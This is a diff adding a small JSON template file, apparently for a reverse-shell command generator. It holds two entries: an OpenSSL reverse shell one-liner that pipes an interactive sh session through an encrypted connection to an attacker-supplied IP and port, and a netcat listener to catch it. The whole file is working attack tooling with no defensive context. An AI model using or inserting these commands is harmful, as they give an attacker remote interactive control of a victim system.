@@ -1,0 +1,14 @@
+{
+  "commands": [
+    {
+      "title": "OpenSSL Reverse Shell",
+      "template": "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
+      "description": "Reverse shell using OpenSSL to connect securely to IP {ip} on port {port}."
+    },
+    {
+      "title": "Netcat Listener",
+      "template": "nc -lvnp {port}",
+      "description": "Listener to catch the reverse shell on port {port}."
+    }
+  ]
+}
